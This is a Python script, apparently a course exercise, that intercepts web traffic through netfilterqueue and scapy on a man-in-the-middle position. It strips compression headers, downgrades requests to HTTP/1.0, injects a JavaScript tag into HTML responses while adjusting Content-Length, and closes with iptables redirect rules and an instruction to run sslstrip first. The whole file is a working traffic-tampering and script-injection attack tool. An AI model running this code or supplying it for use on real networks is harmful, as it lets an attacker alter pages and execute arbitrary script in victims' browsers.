#!/usr/bin/env python

import netfilterqueue                                   #library to access the queue that is stored using iptables.
import scapy.all as scapy
import re                                               #regex library

def set_load(packet,load):                              #function to replace the load with the crafted load and return the packet.
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
   scapy_packet=scapy.IP(packet.get_payload())              #wrapping the payload of the packet into IP layer of the scapy packet.
                                                            #this is done to convert the packet into a scapy packet which is easy to interacy with.
   if scapy_packet.haslayer(scapy.Raw):                     #using the haslayer function to check raw layer in response packet
      load = scapy_packet[scapy.Raw].load
      if scapy_packet[scapy.TCP].dport == 10000:                #to check if the packet is a HTTP request
         load = re.sub("Accept-Encoding:.*?\\r\\n","",load)    #Detecting the regex and replacing it with "" at load.(removes encoding)
         load = load.replace("HTTP/1.1","HTTP/1.0")             #to change http/1.1 which sends pakcets in chunks without content length to lower level(1.0)     protocol
         print("[+]HTTP request")
         # print(scapy_packet.show())
      elif scapy_packet[scapy.TCP].sport == 10000:
                print("[+]HTTP response")
                # print(scapy_packet.show())
                injection_code = "<script>alert('TEST!!!');</script>"     #Any java script to be executed by the browser
                load= load.replace("</body>",injection_code + "</body>")  #replacing a 1st arg with 2nd arg within load.



                # browser keeps track of the no.of character server should send

                content_length_search=re.search("(?:Content-Length:\s)(\d*)",load)  #searching for the contentlength server has sent and storing only the digit. and storing the value
                if content_length_search and "text/html" in load:                   #checking if the load is a htmlpage and has content length in it.
                    content_length=content_length_search.group(1)                   #assigning only the digit from the array.
                    new_content_length= int(content_length) + len(injection_code)   #content length after adding the injection code
                    # print(content_length)
                    load=load.replace(content_length,str(new_content_length))       #replacing with new content length, changing int to str as packets treat it as stings


      if load != scapy_packet[scapy.Raw].load:               #if an of the above if statements get executed then,
          new_packet = set_load(scapy_packet, load)
          # print("modified pac")
          # print(new_packet.show())
          packet.set_payload(str(new_packet))                #attacing the fully crafted scapy_packet into packet.

   packet.accept()

queue = netfilterqueue.NetfilterQueue()         #creating an instance of netfilterqueue object
queue.bind(0,process_packet)                    #bind is a method from NetfilteQueue object.
                                                # it is used to add the existing iptables list that is created; to the queue instance that we have created.
                                                #"0" is the name os the list that we store the iptables content.
                                                # process_packet is the call back functionfunction that gets executed for the each packet.
queue.run()                                     #to run the queue that is created.



#COMMENTS
#run sslstrip before executing the program
#before runninng make sure to run the command to collect all the packets in a queue
# "iptables -I INPUT -j NFQUEUE --que-num 0"
# "iptables -I OUTPUT -j NFQUEUE --que-num 0"
# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

#WORKS on https packets.